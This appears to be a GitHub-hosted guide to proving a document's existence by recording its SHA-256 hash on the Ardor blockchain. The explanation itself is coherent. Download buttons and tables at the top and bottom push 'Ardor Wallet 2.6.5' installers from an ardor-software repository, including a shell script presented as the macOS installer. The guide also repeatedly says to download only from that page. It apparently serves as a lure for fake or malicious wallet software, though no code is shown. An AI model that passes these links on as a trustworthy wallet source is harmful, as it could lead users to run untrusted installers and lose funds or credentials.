![Ardor Wallet guide](assets/banner-article.png)

# Prove a document existed on a date with Ardor

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

Proof of existence means recording a document's hash on chain, so that anyone holding the document later can show it is the same file that was recorded at that time. The chain stores the fingerprint, not the document, and the timestamp is public and unchangeable.

## How the proof works

A hash is a fixed-length fingerprint of a file. Change one character and the [Ardor hash](https://github.com/ardor-software/ardor-wallet-guides/blob/main/verify-your-ardor-wallet-download.md) changes completely, so a hash recorded at a moment in time is evidence that the file existed in that exact form at that moment, and any later edit is visible as a mismatch.

The document itself never goes on [chain](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md). You compute its hash, write that short value into a record, and keep the document wherever you like. Anyone can later recompute the hash from the file and compare it with the record, with no involvement from you.

## Recording a proof

1. Compute the hash of the document on your own machine, using SHA-256 and a tool you trust.
2. Unlock the [Ardor wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-is-an-ardor-wallet.md) and open it on the chain you want the record written to.
3. Open the [Ardor data cloud](https://github.com/ardor-software/ardor-platform-guides/blob/main/keep-files-on-the-ardor-data-cloud.md), create a record and paste the hash, with a short note of what the document is.
4. Confirm the transaction and pay the fee.
5. Note the transaction ID and the block in which it was included.
6. Keep that reference with the document.

Step six completes the proof. A hash in a record is only useful if you can point to where it was recorded and when, and the transaction ID is that pointer.

## What it proves

It proves three things: that a file with this exact content existed at or before the recorded time, that the record has not changed since it was written, and that the record is attributable to the account that wrote it.

That is a narrow claim and a strong one. It does not require anybody to trust you, a notary or a company, because the verification is arithmetic and the record is public, and arithmetic does not take sides in a disagreement.

## What it does not prove

It does not prove the document is true, original, or written by you. It proves that this file existed by then, which is a different statement.

It also does not prove the document was not created earlier. A hash recorded today is consistent with a document written years ago; only the upper bound on the date is established, and that asymmetry is the thing people most often misread.

## Verifying somebody else's proof

1. Obtain the document from them.
2. Compute its SHA-256 hash with your own tool.
3. Find the record on chain, by transaction ID or by the account that wrote it.
4. Compare the two hashes character by character.

If they match, the document is the one that was recorded. If they do not, either the document changed or the proof refers to a different file, and no amount of explanation alters the arithmetic - which is precisely why the check is worth doing before a dispute rather than during one.

## Legal and practical weight

Whether a recorded hash is accepted as evidence depends on the forum, and this page makes no claim about any jurisdiction. What it offers is a timestamp that cannot be backdated by the person presenting it, which is often the part a dispute turns on.

In practice the strongest use is procedural: record the hash when the document is created, keep the transaction reference with the file, and the argument about when it existed stops being about memory. That is worth more than any single dramatic courtroom example, because most disputes about dates are settled by whoever can show a record rather than by whoever remembers best.

## A workflow that survives a dispute

Record the hash when the document is final, not when it is drafted, and record one hash per version. A proof of version three is not a proof of version one, and a dispute about which version was agreed is exactly the one a chain of hashes settles.

Keep the transaction reference beside the file and in whatever system the team already uses. The proof is only as useful as the ability to find it again, and a hash nobody can locate is a hash nobody can present.

## Common mistakes

Recording the document instead of its hash is the first: the data cloud is for small records, and a document does not fit. Recording the hash of a modified copy is the second, which produces a proof of the wrong file.

The third is losing the reference. A hash recorded years ago and no longer linked to its transaction is hard to use, even though the record exists, because finding it again depends on remembering which account wrote it.

## FAQ

### Does the document get uploaded anywhere?

No. Only the hash and your note are recorded. The document stays with you.

### Can I prove a document existed before a certain date?

Not with a hash recorded today. The record establishes an upper bound on the date, not a lower one.

### What hash should I use?

SHA-256. It is the standard choice, it is what the platform's tooling uses, and it is available in every operating system without installing anything extra.

### Can someone else claim my proof?

They can see the record, but it is attributed to the account that wrote it. Keeping control of that account is part of keeping the proof yours.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Store data on the Ardor data cloud](https://github.com/ardor-software/ardor-platform-guides/blob/main/keep-files-on-the-ardor-data-cloud.md)
- [What Ignis is on Ardor, and what the wallet does with it](https://github.com/ardor-software/ardor-platform-guides/blob/main/what-is-ignis-on-ardor.md)
- [Trade on the Ardor coin exchange](https://github.com/ardor-software/ardor-platform-guides/blob/main/trade-on-the-ardor-coin-exchange.md)
- [Create a poll and vote in the Ardor wallet](https://github.com/ardor-software/ardor-platform-guides/blob/main/create-a-poll-in-ardor-wallet.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
